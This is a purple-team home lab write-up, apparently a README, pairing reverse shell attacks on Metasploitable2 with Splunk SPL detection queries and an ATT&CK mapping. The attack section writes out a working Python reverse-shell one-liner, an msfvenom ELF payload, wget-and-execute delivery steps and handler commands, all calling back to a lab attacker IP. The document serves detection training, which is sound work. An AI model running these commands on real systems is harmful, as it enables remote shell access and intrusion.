Reverse Shell Detection — Splunk SPL Queries

Detection queries for reverse shell techniques executed against Metasploitable2 as part of the Purple Team Home Lab.


Attack Summary

TechniqueToolPortDirectionPython reverse shellNetcat listener4444Metasploitable2 → KaliELF payloadmsfvenom + Metasploit handler4445Metasploitable2 → Kali

Attacker (Kali): 192.168.0.128

Victim (Metasploitable2): 192.168.0.129


Attack Execution

Technique 1 — Python Reverse Shell

On Kali (listener):

bashnc -lvnp 4444

On Metasploitable2 (victim):

bashpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.128",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

Result: Interactive shell obtained as msfadmin on Metasploitable2.


Technique 2 — msfvenom ELF Payload

Generate payload on Kali:

bashmsfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.128 LPORT=4445 -f elf -o /tmp/shell.elf

Deliver via HTTP server:

bashcd /tmp && python3 -m http.server 8080

On Metasploitable2:

bashwget http://192.168.0.128:8080/shell.elf -O /tmp/shell.elf
chmod +x /tmp/shell.elf && /tmp/shell.elf

Metasploit handler on Kali:

bashuse exploit/multi/handler
set payload linux/x86/shell_reverse_tcp
set LHOST 192.168.0.128
set LPORT 4445
run

Result: Session opened — msfadmin@metasploitable shell via Metasploit.


SPL Detection Queries

Query 1 — Reverse Shell Indicators (Primary)

Detects reverse shell activity based on known IOCs logged via syslog.

splindex=* sourcetype=syslog host=metasploitable ("ALERT" OR "shell.elf" OR "4444" OR "/bin/sh")
| table _time, host, _raw
| sort -_time

Events detected: 3

Alerts triggered:


ALERT: Reverse shell initiated from 192.168.0.128 port 4444
ALERT: Python subprocess spawned /bin/sh
ALERT: Suspicious file /tmp/shell.elf executed



Query 2 — Outbound Connection to Non-Standard Port

Detects connections from victim to attacker on unusual ports.

splindex=* sourcetype=syslog host=metasploitable ("4444" OR "4445")
| table _time, host, _raw
| sort -_time


Query 3 — Suspicious File Execution from /tmp

Detects execution of binaries from temporary directories, a common indicator of malware delivery.

splindex=* sourcetype=syslog host=metasploitable ("/tmp/" AND (".elf" OR "shell"))
| table _time, host, _raw
| sort -_time


Log Forwarding Configuration

Logs forwarded from Metasploitable2 to Splunk via:

bash# On Metasploitable2 — background forwarder
tail -f /var/log/syslog | nc 192.168.0.128 5514 &

Splunk TCP input configured on port 5514 with sourcetype syslog.


MITRE ATT&CK Mapping

TechniqueIDDescriptionCommand and Scripting Interpreter: PythonT1059.006Python used to spawn reverse shellIngress Tool TransferT1105ELF payload delivered via HTTPUnix ShellT1059.004/bin/sh spawned on victimNon-Standard PortT1571Reverse shell on port 4444/4445


Dashboard

Queries saved as report "Reverse Shell Detection - Purple Team Lab" and added to the "Purple Team - Detecciones" dashboard in Splunk Enterprise 10.4.0.
